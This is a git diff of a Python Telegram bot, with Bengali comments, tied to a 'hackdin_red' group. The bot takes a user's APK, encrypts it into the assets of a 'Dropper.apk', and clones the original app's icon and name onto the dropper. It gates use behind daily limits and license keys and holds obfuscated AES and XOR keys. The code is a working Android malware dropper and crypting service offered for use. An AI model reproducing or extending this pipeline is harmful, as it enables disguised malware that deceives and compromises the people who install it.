@@ -55,8 +55,9 @@ else:
 REQUIRED_GROUP = "@hackdin_red"
 GROUP_INVITE_LINK = "https://t.me/hackdin_red"
 DAILY_LIMIT = 1
-ADMIN_USER_ID = 6593195102
+ADMIN_USER_ID = 6593195102  # আপনার টেলিগ্রাম আইডি বসান
 
+# ----- ক্রিপ্টো (আপনার দেওয়া কী) -----
 OBFUSCATED_AES_KEY_B64 = "Xe53JgjByDVFfeZl9W+TyCcATz4ux1PHf9Mih7Vsre0="
 OBFUSCATED_XOR_KEY_B64 = "W5MCyVrJGGKwWtgXFNS6PvlaH1Xivh/MHO8T+PIhKMd7Eb8+R4NmX23lQBNVefrFbSmG+jNjxZCHBxVos/irfbjkBdfFmp1YIXlQXTXO/HUTCLDghib+WSmsdR4BPVDVQaXHBkclBjuhChvOCSnYolaowwAEkpLlMmfPM0+gkV9NHys8e85JEjmBg5izx48HVVifiL4YhsuxWlKJLfLHodezX2v93DIztfL+UAzGHxtOHfwRagmedxyX+jD18GfpFmLO6GjlUTiymXzGu0uRFuwAd4+o70Yf0Istzoj8h7Az1J33aTQFF5XKAu32zetVnMG1bFQSaQcfm9U1vWcFC0F6ArJNxES6Tar8Bg=="
 
@@ -280,6 +281,7 @@ async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, a
                             if f.endswith('.png'):
                                 shutil.copy2(os.path.join(src, f), dst)
 
+        # ---- শুধুমাত্র package অ্যাট্রিবিউট পরিবর্তন ----
         await send_progress(chat_id, f"🔧 Changing package name to {TARGET_PACKAGE}...", context)
         manifest_path = os.path.join(decoded_user, 'AndroidManifest.xml')
         if os.path.exists(manifest_path):
@@ -322,6 +324,7 @@ async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, a
         shutil.rmtree(decoded_user, ignore_errors=True)
         gc.collect()
 
+        # ---- ২. Dropper প্রসেসিং (প্যাকেজ নাম অপরিবর্তিত) ----
         await send_progress(chat_id, "📖 Decoding Dropper APK...", context)
         dropper_apk = os.path.join(os.getcwd(), 'Dropper.apk')
         if not os.path.exists(dropper_apk):
@@ -337,12 +340,14 @@ async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, a
             return
         await send_progress(chat_id, "✅ Dropper APK decoded.", context)
 
+        # অ্যাসেট রিপ্লেস
         await send_progress(chat_id, "📦 Replacing assets...", context)
         assets_dir = os.path.join(decoded_dropper, 'assets')
         process_encryption(modified_apk_data, assets_dir)
         del modified_apk_data
         gc.collect()
 
+        # ইউজারের আইকন কপি
         await send_progress(chat_id, "🎨 Copying user icon/name...", context)
         res_dropper = os.path.join(decoded_dropper, 'res')
         if os.path.exists(icons_temp):
@@ -368,6 +373,7 @@ async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, a
             except:
                 pass
 
+        # Dropper manifest-এ শুধু label/icon সেট (package নাম অপরিবর্তিত)
         manifest_dropper = os.path.join(decoded_dropper, 'AndroidManifest.xml')
         if os.path.exists(manifest_dropper):
             with open(manifest_dropper, 'r', encoding='utf-8') as f:
@@ -380,6 +386,7 @@ async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, a
                 content = re.sub(r'android:icon=".*?"', 'android:icon="@drawable/img"', content)
             else:
                 content = content.replace('<application ', '<application android:icon="@drawable/img" ')
+            # package নাম অপরিবর্তিত রাখা হয়েছে
             with open(manifest_dropper, 'w', encoding='utf-8') as f:
                 f.write(content)
 
@@ -468,14 +475,12 @@ async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, a
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     
-    # চেক করি অন্য কোনো কাজ চলছে কিনা
     if processing_semaphore.locked():
         await update.message.reply_text(
             "⚠️ Another user is currently processing an APK.\n"
             "You can still use the menu below, but please wait for the current processing to finish before uploading your APK."
         )
     
-    # সব সময় মেনু দেখাই
     keyboard = [
         [InlineKeyboardButton("📤 Upload APK (Free Daily)", callback_data='upload')],
         [InlineKeyboardButton("🔑 Get License Key", callback_data='get_key')]
@@ -489,9 +494,8 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         reply_markup=reply_markup
     )
 
-# ----- টেক্সট মেসেজ হ্যান্ডলার (যেকোনো টেক্সট মেসেজে মেনু দেখায়) -----
+# ----- টেক্সট মেসেজ হ্যান্ডলার (যেকোনো টেক্সট মেসেজে মেনু) -----
 async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    # এটি start কমান্ডের মতোই কাজ করবে, যাতে ইউজার যেকোনো মেসেজে মেনু পায়
     user_id = update.effective_user.id
     
     if processing_semaphore.locked():
@@ -556,7 +560,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def upload_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
 
-    # ---- ১. গ্রুপ চেক ----
+    # গ্রুপ চেক
     try:
         chat_id = "@" + REQUIRED_GROUP.lstrip("@")
         member = await context.bot.get_chat_member(chat_id, user_id)
@@ -571,7 +575,7 @@ async def upload_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         mark_asked_to_join(user_id)
 
-    # ---- ২. ডেইলি লিমিট ও কী চেক ----
+    # ডেইলি লিমিট ও কী চেক
     if not check_daily_limit(user_id):
         if not validate_key(user_id):
             await update.message.reply_text(
@@ -584,7 +588,7 @@ async def upload_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ Please send a valid APK file.")
         return
 
-    # ---- ৩. সেমাফোর চেক (যদি অন্য কোনো কাজ চলছে) ----
+    # সেমাফোর চেক (যদি অন্য কোনো কাজ চলছে)
     if processing_semaphore.locked():
         async with waiting_lock:
             waiting_users.add(user_id)
@@ -593,7 +597,7 @@ async def upload_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         return
 
-    # ---- ৪. কাজ শুরু ----
+    # কাজ শুরু
     await update.message.reply_text("📦 APK received! Processing...")
 
     try:
@@ -668,12 +672,10 @@ def run_bot():
             application.add_handler(CommandHandler("genkey", genkey_command))
             application.add_handler(CallbackQueryHandler(button_handler))
             application.add_handler(MessageHandler(filters.Document.ALL, upload_handler))
-            # টেক্সট মেসেজ হ্যান্ডলার (যেকোনো টেক্সট মেসেজে মেনু দিতে)
             application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))
 
             logger.info("✅ Bot starting polling...")
             application.run_polling(drop_pending_updates=True)
-            # যদি এখানে পৌঁছায়, মানে polling থেমে গেছে (যেমন Conflict)
             logger.warning("⚠️ Bot polling stopped unexpectedly. Restarting in 5 seconds...")
             time.sleep(5)
         except Exception as e:
